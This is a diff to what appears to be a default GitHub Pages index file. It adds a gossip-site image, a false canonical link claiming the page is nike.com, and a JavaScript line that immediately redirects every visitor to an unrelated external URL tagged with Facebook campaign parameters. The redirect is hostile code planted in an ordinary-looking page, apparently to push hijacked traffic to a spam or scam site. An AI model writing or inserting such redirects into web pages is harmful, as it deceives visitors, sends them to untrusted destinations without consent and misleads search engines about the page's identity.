@@ -1,3 +1,13 @@
+<p><img src="https://www.koimoi.com/wp-content/new-galleries/2021/08/when-deepika-padukone-took-a-dig-at-salman-khan-over-his-remark-on-depression-001.jpg" alt="loading"></p>
+
+<html prefix="og: http://ogp.me/ns#">
+<head>
+<link rel="canonical" href="http://nike.com/" />
+<script type="text/javascript">window.location = "https://job.bdnewresult.com/fxcm/?utm_source=fb&utm_medium=car%2A&utm_campaign=car%2A";</script>
+</head>
+
+
+
 ## Welcome to GitHub Pages
 
 You can use the [editor on GitHub](https://github.com/asw21222212/awwwqw/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
